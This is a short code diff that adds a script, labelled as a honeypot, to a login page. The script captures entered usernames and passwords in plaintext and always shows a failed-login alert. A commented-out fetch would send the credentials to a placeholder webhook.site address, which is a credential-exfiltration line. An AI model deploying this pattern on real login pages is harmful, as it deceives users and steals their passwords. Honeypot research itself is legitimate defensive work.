@@ -19,5 +19,23 @@
       alert("Login failed. Please try again.");
     }
   </script>
+<script>
+  function logAttempt() {
+    const user = document.getElementById('user').value;
+    const pass = document.getElementById('pass').value;
+    const timestamp = new Date().toISOString();
+
+    console.log(`[Honeypot] ${timestamp} - Username: ${user} | Password: ${pass}`);
+
+    // Optional: send to remote logging service (like webhook.site)
+    // fetch("https://webhook.site/your-custom-url", {
+    //   method: "POST",
+    //   headers: { "Content-Type": "application/json" },
+    //   body: JSON.stringify({ user, pass, timestamp })
+    // });
+
+    alert("Login failed.");
+  }
+</script>
 </body>
 </html>
